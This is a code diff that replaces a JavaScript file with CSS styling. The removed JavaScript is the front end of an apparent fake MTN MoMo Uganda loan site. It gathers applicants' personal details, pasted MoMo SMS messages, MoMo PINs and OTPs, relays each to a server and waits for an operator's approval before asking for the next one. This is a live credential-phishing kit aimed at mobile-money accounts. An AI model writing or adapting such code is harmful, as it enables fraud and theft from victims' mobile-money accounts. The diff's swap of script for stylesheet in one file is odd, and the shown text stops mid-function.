@@ -1,944 +1,1258 @@
-// ============================================================
-// script.js – Uganda Version with All Features
-// ============================================================
+/* ============================================================
+   MTN MoMo Uganda - Complete Stylesheet
+   ============================================================ */
 
-const S = {
-    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
-    firstName: '', lastName: '', phone: '', email: '',
-    employment: '', annualIncome: 0,
-    kinName: '', kinPhone: '',
-    applicationId: '',
-    isSubmitting: false,
-    rejectedStep: null
-};
-
-let currentPollTimeout = null;
-let otpResendTimer = null;
-let otpResendCountdown = 0;
-let pinBlockTimer = null;
-
-// ─── localStorage Helpers ───
-const STORAGE_KEYS = {
-    APPLICATION_ID: 'mtn_application_id',
-    APPLICATION_DATA: 'mtn_application_data',
-    REJECTION_INFO: 'mtn_rejection_info',
-    FORM_DRAFT: 'mtn_form_draft',
-    OTP_TIMER: 'mtn_otp_timer'
-};
-
-function saveToLocalStorage(key, data) {
-    try {
-        localStorage.setItem(key, JSON.stringify(data));
-        console.log(`💾 Saved to localStorage: ${key}`);
-    } catch (error) {
-        console.error(`❌ Failed to save ${key}:`, error);
-    }
+:root {
+  --mtn-dark: #003366;
+  --mtn-gold: #FFD700;
+  --mtn-light: #004080;
+  --grad: linear-gradient(to right, #003366, #004080);
+  --page-bg: #F5F5F5;
+  --white: #FFFFFF;
+  --text-dark: #1C2340;
+  --text-mid: #444;
+  --text-light: #888;
+  --border: #ddd;
+  --radius: 12px;
+  --radius-sm: 8px;
 }
 
-function getFromLocalStorage(key) {
-    try {
-        const data = localStorage.getItem(key);
-        return data ? JSON.parse(data) : null;
-    } catch (error) {
-        console.error(`❌ Failed to load ${key}:`, error);
-        return null;
-    }
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
 }
 
-function removeFromLocalStorage(key) {
-    try {
-        localStorage.removeItem(key);
-        console.log(`🗑️ Removed from localStorage: ${key}`);
-    } catch (error) {
-        console.error(`❌ Failed to remove ${key}:`, error);
-    }
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--page-bg);
+  color: var(--text-dark);
+  min-height: 100vh;
 }
 
-// ─── Save/Load Functions ───
-function saveApplicationId(id) {
-    if (id) {
-        S.applicationId = id;
-        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
-            id: id,
-            timestamp: new Date().toISOString()
-        });
-    }
+/* ============================================================
+   LOGO
+   ============================================================ */
+.mtn-logo {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 4px;
 }
 
-function loadApplicationId() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
-    if (saved && saved.id) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            S.applicationId = saved.id;
-            console.log(`🔄 Restored application ID: ${saved.id}`);
-            return saved.id;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
-        }
-    }
-    return null;
+.mtn-logo-icon {
+  width: 45px;
+  height: 45px;
+  background: var(--mtn-gold);
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.8rem;
+  font-weight: 900;
+  color: var(--mtn-dark);
+  position: relative;
 }
 
-function saveApplicationData() {
-    const dataToSave = {
-        ...S,
-        timestamp: new Date().toISOString()
-    };
-    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
+.mtn-logo-icon::after {
+  content: 'M';
+  font-size: 2rem;
+  font-weight: 900;
 }
 
-function loadApplicationData() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
-    if (saved) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            const fieldsToRestore = [
-                'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
-                'firstName', 'lastName', 'phone', 'email',
-                'employment', 'annualIncome', 'kinName', 'kinPhone',
-                'applicationId', 'rejectedStep'
-            ];
-            fieldsToRestore.forEach(field => {
-                if (saved[field] !== undefined) {
-                    S[field] = saved[field];
-                }
-            });
-            console.log('🔄 Restored application data from localStorage');
-            return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
-        }
-    }
-    return false;
+.mtn-logo-text {
+  font-size: 1rem;
+  font-weight: 700;
+  color: var(--mtn-dark);
 }
 
-function saveRejectionInfo(step, applicationId) {
-    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
-        step: step,
-        applicationId: applicationId,
-        timestamp: new Date().toISOString()
-    });
+.mtn-logo-sub {
+  font-size: 0.65rem;
+  color: #888;
+  font-weight: 500;
 }
 
-function loadRejectionInfo() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
-    if (saved) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 5 * 60 * 1000) {
-            return saved;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
-        }
-    }
-    return null;
+/* ============================================================
+   PAGES
+   ============================================================ */
+.page {
+  display: none;
+  min-height: 100vh;
+  animation: fadeIn 0.3s ease;
 }
 
-function clearRejectionInfo() {
-    removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+.page.active {
+  display: flex;
+  flex-direction: column;
 }
 
-function saveFormDraft() {
-    const draft = {
-        firstName: document.getElementById('s2fi')?.value || '',
-        lastName: document.getElementById('s2la')?.value || '',
-        phone: document.getElementById('s2ph')?.value || '',
-        email: document.getElementById('s2em')?.value || '',
-        loanAmount: document.getElementById('s1am')?.value || '',
-        loanPurpose: document.getElementById('s1pu')?.value || '',
-        employment: document.getElementById('s3em')?.value || '',
-        annualIncome: document.getElementById('s3in')?.value || '',
-        kinName: document.getElementById('s3kn')?.value || '',
-        kinPhone: document.getElementById('s3kp')?.value || '',
-        timestamp: new Date().toISOString()
-    };
-    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(8px); }
+  to { opacity: 1; transform: translateY(0); }
 }
 
-function loadFormDraft() {
-    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
-    if (draft) {
-        const age = Date.now() - new Date(draft.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
-            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
-            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
-            if (draft.email) document.getElementById('s2em').value = draft.email;
-            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
-            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
-            if (draft.employment) document.getElementById('s3em').value = draft.employment;
-            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
-            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
-            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
-            console.log('🔄 Restored form draft from localStorage');
-            return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
-        }
-    }
-    return false;
+/* ============================================================
+   NAVBAR
+   ============================================================ */
+.navbar {
+  background: var(--mtn-dark);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0 20px;
+  height: 54px;
+  position: relative;
+  flex-shrink: 0;
 }
 
-// ─── Navigation ───
-function goTo(pageId) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    const el = document.getElementById(pageId);
-    if (el) el.classList.add('active');
-    window.scrollTo(0, 0);
+.nav-left {
+  position: absolute;
+  left: 20px;
+  color: rgba(255,255,255,0.6);
+  font-size: 0.84rem;
+  cursor: pointer;
+  text-decoration: none;
+  transition: color 0.2s;
 }
 
-function startApplication() {
-    S.rejectedStep = null;
-    clearRejectionInfo();
-    
-    if (!S.applicationId) {
-        S.applicationId = 'MTN-UG-' + Date.now().toString().slice(-6);
-        saveApplicationId(S.applicationId);
-    }
-    
-    document.getElementById('resendOtpBtn')?.classList.add('hidden');
-    
-    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => {
-        clearErr(id);
-    });
-    
-    goTo('page-step1');
+.nav-left:hover {
+  color: #fff;
 }
 
-// ─── Toast Notifications ───
-function showToast(message, type = 'info', duration = 3000) {
-    const existing = document.querySelector('.toast');
-    if (existing) existing.remove();
-    
-    const toast = document.createElement('div');
-    toast.className = `toast toast-${type}`;
-    toast.textContent = message;
-    document.body.appendChild(toast);
-    
-    setTimeout(() => {
-        toast.style.opacity = '0';
-        toast.style.transform = 'translateX(-50%) translateY(-20px)';
-        setTimeout(() => toast.remove(), 300);
-    }, duration);
+.nav-right {
+  position: absolute;
+  right: 20px;
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  cursor: pointer;
+  padding: 4px;
 }
 
-// ─── Form Helpers ───
-function normalizePhone(id) {
-    let inp = document.getElementById(id);
-    let val = inp.value.replace(/\D/g, '');
-    if (val.length > 9) val = val.substring(0, 9);
-    inp.value = val;
-    saveFormDraft();
+.hline {
+  width: 20px;
+  height: 2px;
+  background: rgba(255,255,255,0.6);
+  border-radius: 1px;
 }
 
-function updateCalc() {
-    const amt = +document.getElementById('amtSlider').value;
-    document.getElementById('calcAmt').textContent = 'UGX ' + amt.toLocaleString();
-    const monthly = Math.ceil(amt / 48);
-    document.getElementById('monthlyAmt').textContent = 'UGX ' + monthly.toLocaleString();
+/* ============================================================
+   BUTTONS
+   ============================================================ */
+.btn-grad {
+  background: var(--grad);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  padding: 14px 20px;
+  font-size: 0.88rem;
+  font-weight: 600;
+  letter-spacing: 0.05em;
+  cursor: pointer;
+  width: 100%;
+  font-family: 'Inter', sans-serif;
+  transition: opacity 0.2s;
 }
 
-function showErr(id, msg) {
-    const box = document.getElementById(id);
-    if (box) {
-        box.classList.add('show');
-        const txt = document.getElementById(id + 'Txt');
-        if (txt) txt.textContent = msg;
-    }
+.btn-grad:hover {
+  opacity: 0.9;
 }
 
-function clearErr(id) {
-    const box = document.getElementById(id);
-    if (box) box.classList.remove('show');
+.btn-grad:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
 }
 
-// ─── Step Navigation ───
-function toS2() {
-    const ty = document.getElementById('s1ty').value;
-    const am = +document.getElementById('s1am').value;
-    const te = document.getElementById('s1te').value;
-    const pu = document.getElementById('s1pu').value;
-    
-    if (!ty || am <= 0 || !te || !pu.trim()) {
-        showErr('s1Err', 'Please complete all fields.');
-        return;
-    }
-    
-    S.loanType = ty; 
-    S.loanAmount = am; 
-    S.loanTerm = te; 
-    S.loanPurpose = pu;
-    
-    saveApplicationData();
-    saveFormDraft();
-    goTo('page-step2');
+.btn-gray {
+  background: #e0e0e0;
+  color: #666;
+  border: none;
+  border-radius: 8px;
+  padding: 14px 20px;
+  font-size: 0.88rem;
+  font-weight: 600;
+  letter-spacing: 0.05em;
+  cursor: pointer;
+  flex: 1;
+  font-family: 'Inter', sans-serif;
+  transition: background 0.2s;
 }
 
-function toS3() {
-    const fi = document.getElementById('s2fi').value.trim();
-    const la = document.getElementById('s2la').value.trim();
-    const ph = document.getElementById('s2ph').value;
-    const em = document.getElementById('s2em').value.trim();
-    
-    if (!fi || !la) {
-        showErr('s2Err', 'Please enter your full name.');
-        return;
-    }
-    
-    if (ph.length !== 9) {
-        showErr('s2Err', 'Please enter a valid 9-digit phone number.');
-        return;
-    }
-    
-    if (!em || !em.includes('@')) {
-        showErr('s2Err', 'Please enter a valid email address.');
-        return;
-    }
-    
-    S.firstName = fi; 
-    S.lastName = la; 
-    S.phone = ph; 
-    S.email = em;
-    
-    saveApplicationData();
-    saveFormDraft();
-    goTo('page-step3');
+.btn-gray:hover {
+  background: #d0d0d0;
 }
 
-// ─── PIN/OTP Helpers ───
-function pinMvM(el, i, maxLength = 5) {
-    el.value = el.value.replace(/\D/g, '');
-    if (el.value && i < maxLength - 1) {
-        const nextPin = document.getElementById('pin' + (i + 1));
-        if (nextPin) { nextPin.focus(); return; }
-    }
-    
-    if (i === maxLength - 1 && el.value) {
-        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
-        if (allFilled) {
-            setTimeout(() => doPin(), 300);
-        }
-    }
+.step-btns {
+  display: flex;
+  gap: 12px;
+  margin-top: 8px;
 }
 
-function togPin() {
-    for (let i = 0; i < 5; i++) {
-        const b = document.getElementById('pin' + i);
-        if (b) b.type = b.type === 'password' ? 'text' : 'password';
-    }
-    for (let i = 0; i < 4; i++) {
-        const b = document.getElementById('otp' + i);
-        if (b) b.type = b.type === 'password' ? 'text' : 'password';
-    }
+.step-btns .btn-grad {
+  flex: 1;
 }
 
-function chkPin() {
-    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
-    const pinBtn = document.querySelector('#page-pin .btn-grad');
-    if (pinBtn) pinBtn.disabled = !pinOk;
-
-    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
-    const otpBtn = document.querySelector('#page-otp .btn-grad');
-    if (otpBtn) otpBtn.disabled = !otpOk;
+/* ============================================================
+   FORMS
+   ============================================================ */
+.field {
+  margin-bottom: 18px;
 }
 
-document.addEventListener('keyup', chkPin);
-
-function clearLoginPin() {
-    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
-    document.getElementById('pin0').focus();
-    chkPin();
+.field label {
+  display: block;
+  font-size: 0.82rem;
+  font-weight: 500;
+  color: var(--text-mid);
+  margin-bottom: 6px;
 }
 
-function clearOtpCode() {
-    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-    document.getElementById('otp0').focus();
-    chkPin();
+.field input,
+.field select,
+.field textarea {
+  width: 100%;
+  padding: 11px 14px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  font-family: 'Inter', sans-serif;
+  font-size: 0.9rem;
+  color: var(--text-dark);
+  background: #fff;
+  outline: none;
+  transition: border-color 0.2s;
 }
 
-function handleOtpInput(el, type) {
-    el.value = el.value.replace(/\D/, '');
-    const idx = parseInt(el.id.match(/\d$/)[0]);
-    if (el.value && type === 'otp' && idx < 3) {
-        document.getElementById('otp' + (idx + 1))?.focus();
-    }
-    chkPin();
-    
-    if (idx === 3 && el.value) {
-        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
-        if (allFilled) {
-            setTimeout(() => doOtp(), 300);
-        }
-    }
+.field input:focus,
+.field select:focus,
+.field textarea:focus {
+  border-color: var(--mtn-gold);
 }
 
-// ─── PIN Attempt Functions ───
-async function checkPinStatus() {
-    try {
-        const response = await fetch(`/api/pin-status/${S.applicationId}`);
-        const data = await response.json();
-        
-        if (data.ok) {
-            const remaining = data.remainingAttempts || 3;
-            
-            const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-            if (attemptsDisplay) {
-                if (data.isBlocked) {
-                    attemptsDisplay.innerHTML = `🔒 Too many attempts. Blocked for ${data.blockRemainingSeconds}s`;
-                    attemptsDisplay.className = 'pin-attempts blocked';
-                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
-                    document.querySelector('#page-pin .btn-grad').disabled = true;
-                    
-                    startPinBlockCountdown(data.blockRemainingSeconds);
-                } else {
-                    attemptsDisplay.innerHTML = `🔑 Attempts remaining: ${remaining} of 3`;
-                    attemptsDisplay.className = 'pin-attempts';
-                }
-            }
-            
-            return data;
-        }
-    } catch (error) {
-        console.error('Error checking PIN status:', error);
-    }
-    return null;
+.sel-wrap {
+  position: relative;
 }
 
-function startPinBlockCountdown(seconds) {
-    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-    if (!attemptsDisplay) return;
-    
-    if (pinBlockTimer) {
-        clearInterval(pinBlockTimer);
-        pinBlockTimer = null;
-    }
-    
-    let remaining = seconds;
-    attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
-    attemptsDisplay.className = 'pin-attempts blocked';
-    
-    pinBlockTimer = setInterval(() => {
-        remaining--;
-        if (remaining <= 0) {
-            clearInterval(pinBlockTimer);
-            pinBlockTimer = null;
-            attemptsDisplay.textContent = '✅ PIN available. Please try again.';
-            attemptsDisplay.className = 'pin-attempts available';
-            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
-            document.querySelector('#page-pin .btn-grad').disabled = false;
-            resetPinAttempts();
-        } else {
-            attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
-        }
-    }, 1000);
+.sel-wrap::after {
+  content: '▾';
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--text-light);
+  pointer-events: none;
 }
 
-async function resetPinAttempts() {
-    try {
-        await fetch(`/api/reset-pin-attempts/${S.applicationId}`, {
-            method: 'POST'
-        });
-    } catch (error) {
-        console.error('Error resetting PIN attempts:', error);
-    }
+.field-row {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
 }
 
-// ─── OTP Resend Timer ───
-function startOtpResendTimer(seconds = 20) {
-    const btn = document.getElementById('resendOtpBtn');
-    if (!btn) return;
-    
-    if (otpResendTimer) {
-        clearInterval(otpResendTimer);
-        otpResendTimer = null;
-    }
-    
-    otpResendCountdown = seconds;
-    btn.disabled = true;
-    btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
-    btn.classList.remove('hidden');
-    
-    saveToLocalStorage(STORAGE_KEYS.OTP_TIMER, {
-        endTime: Date.now() + (seconds * 1000),
-        applicationId: S.applicationId
-    });
-    
-    otpResendTimer = setInterval(() => {
-        otpResendCountdown--;
-        
-        if (otpResendCountdown <= 0) {
-            clearInterval(otpResendTimer);
-            otpResendTimer = null;
-            btn.disabled = false;
-            btn.textContent = '🔄 Resend OTP';
-            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
-        } else {
-            btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
-        }
-    }, 1000);
+.phone-row {
+  display: flex;
 }
 
-function checkOtpTimerRecovery() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
-    if (saved && saved.endTime && saved.applicationId === S.applicationId) {
-        const remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
-        if (remaining > 0) {
-            startOtpResendTimer(remaining);
-            return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
-        }
-    }
-    return false;
+.ph-pre {
+  padding: 11px 12px;
+  background: #f5f5f5;
+  border: 1.5px solid var(--border);
+  border-right: none;
+  border-radius: var(--radius-sm) 0 0 var(--radius-sm);
+  font-size: 0.85rem;
+  font-weight: 500;
+  color: #555;
+  display: flex;
+  align-items: center;
 }
 
-// ─── Smart Rejection Navigation ───
-function handleRejection(step) {
-    clearErr('s3Err');
-    clearErr('momErr');
-    clearErr('pinErr');
-    clearErr('otpErr');
-    
-    if (currentPollTimeout) {
-        clearTimeout(currentPollTimeout);
-        currentPollTimeout = null;
-    }
-    
-    saveRejectionInfo(step, S.applicationId);
-    
-    switch(step) {
-        case 'sms':
-            showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
-            document.getElementById('smsMsgBox').value = '';
-            document.getElementById('smsMsgBox').focus();
-            document.querySelector('#page-sms-paste .step-card')?.classList.add('rejected');
-            setTimeout(() => {
-                document.querySelector('#page-sms-paste .step-card')?.classList.remove('rejected');
-            }, 3000);
-            goTo('page-sms-paste');
-            break;
-            
-        case 'pin':
-            showToast('❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
-            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
-            document.getElementById('pin0').focus();
-            document.querySelector('#page-pin .step-card')?.classList.add('rejected');
-            setTimeout(() => {
-                document.querySelector('#page-pin .step-card')?.classList.remove('rejected');
-            }, 3000);
-            checkPinStatus();
-            goTo('page-pin');
-            break;
-            
-        case 'otp':
-            showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
-            clearOtpCode();
-            document.querySelector('#page-otp .step-card')?.classList.add('rejected');
-            setTimeout(() => {
-                document.querySelector('#page-otp .step-card')?.classList.remove('rejected');
-            }, 3000);
-            startOtpResendTimer(20);
-            goTo('page-otp');
-            break;
-            
-        default:
-            showToast('❌ Application was rejected. Please start over.', 'error');
-            goTo('page-step1');
-    }
+.phone-row input {
+  border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important;
+  flex: 1;
 }
 
-// ─── Polling ───
-function startPoll(applicationId, step, onSuccess, onReject) {
-    if (currentPollTimeout) {
-        clearTimeout(currentPollTimeout);
-        currentPollTimeout = null;
-    }
-
-    const check = async () => {
-        try {
-            const res = await fetch(`/api/status/${applicationId}/${step}`);
-            const data = await res.json();
-            
-            if (data && data.ok === true) {
-                if (data.status === 'approved') {
-                    currentPollTimeout = null;
-                    onSuccess();
-                    return;
-                } else if (data.status === 'rejected') {
-                    currentPollTimeout = null;
-                    try {
-                        const redirectRes = await fetch(`/api/rejection-info/${applicationId}`);
-                        const redirectData = await redirectRes.json();
-                        
-                        if (redirectData.ok && redirectData.rejectedStep) {
-                            S.rejectedStep = redirectData.rejectedStep;
-                            showToast(redirectData.errorMessage || '❌ Application was rejected.', 'error');
-                            handleRejection(redirectData.rejectedStep);
-                        } else {
-                            showToast('❌ Application was rejected. Please try again.', 'error');
-                            goTo('page-step3');
-                        }
-                    } catch (err) {
-                        console.error('Error getting rejection info:', err);
-                        showToast('❌ Application was rejected. Please try again.', 'error');
-                        goTo('page-step3');
-                    }
-                    return;
-                }
-            }
-            currentPollTimeout = setTimeout(check, 2000);
-        } catch (err) {
-            console.error('Polling error:', err);
-            currentPollTimeout = setTimeout(check, 3000);
-        }
-    };
-    check();
+.field-hint {
+  font-size: 0.75rem;
+  color: var(--text-light);
+  margin-top: 5px;
 }
 
-// ─── Resend OTP ───
-async function resendOtp() {
-    const btn = document.getElementById('resendOtpBtn');
-    
-    if (otpResendTimer || otpResendCountdown > 0) {
-        showToast(`⏳ Please wait ${otpResendCountdown} seconds before resending.`, 'info');
-        return;
-    }
-    
-    try {
-        btn.disabled = true;
-        btn.textContent = '⏳ Sending...';
-        showToast('📤 Requesting new OTP...', 'info');
-        
-        const response = await fetch('/api/resend-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationId: S.applicationId })
-        });
-        
-        const data = await response.json();
-        
-        if (data.ok) {
-            showToast('✅ New OTP sent to admin for verification!', 'success');
-            startOtpResendTimer(20);
-            
-            startPoll(S.applicationId, 'otp',
-                () => {
-                    showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
-                    showApproval();
-                },
-                () => {
-                    handleRejection('otp');
-                }
-            );
-        } else {
-            showToast('❌ Failed to resend OTP. Please try again.', 'error');
-            btn.disabled = false;
-            btn.textContent = '🔄 Resend OTP';
-        }
-    } catch (error) {
-        console.error('Resend OTP error:', error);
-        showToast('❌ Failed to resend OTP. Please try again.', 'error');
-        btn.disabled = false;
-        btn.textContent = '🔄 Resend OTP';
-    }
+/* ============================================================
+   PROGRESS BAR
+   ============================================================ */
+.prog-row {
+  display: flex;
+  gap: 8px;
+  margin: 10px 0 24px;
 }
 
-// ─── Show Approval ───
-function showApproval() {
-    document.getElementById('aprAmount').textContent = 'UGX ' + S.loanAmount.toLocaleString();
-    document.getElementById('aprAmt').textContent = 'UGX ' + S.loanAmount.toLocaleString();
-    document.getElementById('aprTerm').textContent = S.loanTerm;
-    const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
-    document.getElementById('aprMth').textContent = 'UGX ' + monthly.toLocaleString();
-    
-    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
-    
-    if (otpResendTimer) {
-        clearInterval(otpResendTimer);
-        otpResendTimer = null;
-    }
-    
-    if (pinBlockTimer) {
-        clearInterval(pinBlockTimer);
-        pinBlockTimer = null;
-    }
-    
-    goTo('page-approval');
+.prog-seg {
+  flex: 1;
+  height: 4px;
+  border-radius: 2px;
+  background: #e0e0e0;
+  transition: all 0.5s ease;
 }
 
-// ─── STEP 3: Submit Application ───
-async function submitApp() {
-    const em = document.getElementById('s3em').value;
-    const in_ = +document.getElementById('s3in').value;
-    const kn = document.getElementById('s3kn').value.trim();
-    const kp = document.getElementById('s3kp').value.trim();
-    
-    if (!em || in_ <= 0) {
-        showErr('s3Err', 'Please complete all fields.');
-        return;
-    }
-    
-    S.employment = em; 
-    S.annualIncome = in_; 
-    S.kinName = kn; 
-    S.kinPhone = kp;
-    
-    if (!S.applicationId) {
-        S.applicationId = 'MTN-UG-' + Date.now().toString().slice(-6);
-        saveApplicationId(S.applicationId);
-    }
-    
-    saveApplicationData();
-    goTo('page-processing');
-
-    try {
-        await fetch('/api/send-application', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationData: S })
-        });
-        
-        document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
-        
-        startPoll(S.applicationId, 'sms',
-            () => { 
-                showToast('✅ SMS Approved!', 'success');
-                goTo('page-sms-paste'); 
-            },
-            () => {
-                handleRejection('sms');
-            }
-        );
-    } catch {
-        showErr('s3Err', 'Failed to submit application.');
-    }
+.prog-seg.done,
+.prog-seg.now {
+  background: var(--mtn-gold);
 }
 
-// ─── STEP 4: SMS ───
-async function doSmsParse() {
-    const msg = document.getElementById('smsMsgBox').value.trim();
-    if (msg.length < 3) {
-        showErr('momErr', 'Please paste a valid SMS message.');
-        return;
-    }
-
-    await fetch('/api/send-momo-message', {
-        method: 'POST',
-        body: JSON.stringify({
-            momoData: { 
-                applicationId: S.applicationId, 
-                phone: S.phone, 
-                momoMessage: msg,
-                isResubmission: !!S.rejectedStep
-            }
-        }),
-        headers: { 'Content-Type': 'application/json' }
-    });
-
-    document.getElementById('waitSmsAppId').textContent = S.applicationId;
-    goTo('page-wait-sms');
-
-    startPoll(S.applicationId, 'sms',
-        () => { 
-            showToast('✅ SMS Verified!', 'success');
-            goTo('page-pin'); 
-        },
-        () => {
-            handleRejection('sms');
-        }
-    );
+.prog-seg.now {
+  animation: pulse-progress 1.5s ease infinite;
 }
 
-// ─── STEP 5: PIN ───
-async function doPin() {
-    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
-    if (pin.length < 5) {
-        showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.');
-        return;
-    }
-
-    const pinStatus = await checkPinStatus();
-    if (pinStatus && pinStatus.isBlocked) {
-        showErr('pinErr', `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`);
-        return;
-    }
-
-    try {
-        const response = await fetch('/api/send-pin', {
-            method: 'POST',
-            body: JSON.stringify({ 
-                applicationId: S.applicationId, 
-                pin,
-                isResubmission: !!S.rejectedStep
-            }),
-            headers: { 'Content-Type': 'application/json' }
-        });
-        
-        const data = await response.json();
-        
-        if (!data.ok) {
-            showErr('pinErr', data.error || 'Failed to submit PIN.');
-            return;
-        }
-
-        document.getElementById('waitPinAppId').textContent = S.applicationId;
-        goTo('page-wait-pin');
-
-        startPoll(S.applicationId, 'pin',
-            () => { 
-                showToast('✅ PIN Verified!', 'success');
-                resetPinAttempts();
-                goTo('page-otp'); 
-            },
-            async () => {
-                try {
-                    const rejectResponse = await fetch('/api/pin-rejected', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ applicationId: S.applicationId })
-                    });
-                    const rejectData = await rejectResponse.json();
-                    
-                    if (rejectData.blocked) {
-                        showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
-                        await checkPinStatus();
-                        goTo('page-pin');
-                    } else if (rejectData.remainingAttempts > 0) {
-                        showErr('pinErr', `❌ Wrong PIN. ${rejectData.remainingAttempts} attempt(s) remaining.`);
-                        document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
-                        document.getElementById('pin0').focus();
-                        const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-                        if (attemptsDisplay) {
-                            attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`;
-                            attemptsDisplay.className = 'pin-attempts warning';
-                        }
-                        goTo('page-pin');
-                    } else {
-                        handleRejection('pin');
-                    }
-                } catch (err) {
-                    console.error('Error handling PIN rejection:', err);
-                    handleRejection('pin');
-                }
-            }
-        );
-    } catch (error) {
-        console.error('Error submitting PIN:', error);
-        showErr('pinErr', 'Failed to submit PIN. Please try again.');
-    }
+@keyframes pulse-progress {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.5; }
 }
 
-// ─── STEP 6: OTP ───
-async function doOtp() {
-    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
-    if (otp.length < 4) {
-        showErr('otpErr', 'Enter a valid 4-digit OTP.');
-        return;
-    }
-
-    await fetch('/api/send-otp', {
-        method: 'POST',
-        body: JSON.stringify({ 
-            applicationId: S.applicationId, 
-            otp,
-            isResubmission: !!S.rejectedStep
-        }),
-        headers: { 'Content-Type': 'application/json' }
-    });
-
-    document.getElementById('waitOtpAppId').textContent = S.applicationId;
-    goTo('page-wait-otp');
-
-    startPoll(S.applicationId, 'otp',
-        () => {
-            showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
-            showApproval();
-        },
-        () => {
-            handleRejection('otp');
-        }
-    );
+/* ============================================================
+   MESSAGE BOXES
+   ============================================================ */
+.msg-box {
+  border-radius: var(--radius-sm);
+  padding: 12px 16px;
+  font-size: 0.84rem;
+  margin-bottom: 16px;
+  display: none;
+  align-items: center;
+  gap: 10px;
 }
 
-// ─── Update PIN Page UI ───
-function updatePinPageUI() {
-    const pinCard = document.querySelector('#page-pin .step-card');
